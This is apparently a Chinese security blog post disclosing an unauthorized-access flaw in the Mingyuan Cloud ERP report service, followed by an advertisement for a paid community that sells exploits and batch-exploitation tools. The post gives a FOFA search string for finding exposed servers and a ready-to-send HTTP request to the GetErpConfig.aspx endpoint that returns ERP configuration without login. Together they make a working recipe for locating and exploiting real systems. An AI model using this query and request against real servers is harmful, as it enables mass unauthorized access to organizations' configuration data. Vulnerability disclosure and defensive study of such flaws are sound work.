#  明源云erp报表 geterpconfig 未授权访问漏洞   
原创 CatalyzeSec  CatalyzeSec   2024-10-18 20:30  
  
FOFA  
```
body="报表服务已正常运行"
```  
# 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ynfcF4apkSh5ppBLDysjASYFGTClZ9897yxicVAvvfQPzLl3okGVvey55oZf0USR1SB1LGUa1VkTBg/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ynfcF4apkSh5ppBLDysjASYgic8NgBlmrTy4Isn9iaSxR5xo1Wgh2TSbSjiaeSibNaQibEVLpa6tykczBQ/640?wx_fmt=other&from=appmsg "")  
  
POC  
```
GET /service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
```  
  
**nuclei运行结果**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ynfcF4apkSh5ppBLDysjASYSWic9TCUiaeVLRVt19Fx3oqJBeyPqm1LI4BqtuoVVzAEic80w6mjs3g0A/640?wx_fmt=other&from=appmsg "")  
  
**nuclei-POC已上传到知识星球**  
  
****  
高质量安全知识星球社区，致力于漏洞挖掘，渗透技巧，安全资料，星球承诺会持续更新0/1/NDay及对应的批量利用工具，团队内部漏洞库，内外网攻防技巧，你所需要的各类安全工具和资料以及团队师傅们最新的学习研究成果。分享行业内最新动态，解答交流各类技术问题。  
涉及方向包括Web渗透、免杀绕过、红蓝攻防、代码审计、应急响应、安全培训、CTF、小白入门、职业规划和疑难解答。**CatalyzeSec**  
，安全技术水平的催化者，星球针对成员的技术问题，快速提供思考方向及解决方案，并为星友提供多种方向的学习资料、安全工具、POC&EXP以及各种学习笔记等，以引导者和催化剂的方式助力安全技术水平的提升。  
我们是一个快速成长的team，团队的发展方向与每一位星友的学习方向密切相关，加入我们，一起成为更好的自己！  
PS：随着星球内知识的积累，人员的增加，  
星球价格也会随之增加，前一百位加入我们的师傅可享受99元朋友价！  
  
**团队内部独家知识库**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ynfcF4apkSh5ppBLDysjASY4bGd9cbj52kq0w6YER8gChNwGp51qqNvxbu098QXt7RRZyzYJ6cSRQ/640?wx_fmt=other&from=appmsg "")  
  
**微信群专属推送机器人**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ynfcF4apkSh5ppBLDysjASYh8GdckIwNlIKwCSgddFQtfQBPicSputMhyaxSeTC5v6aibWldiblSqsAA/640?wx_fmt=other&from=appmsg "")  
  
****  
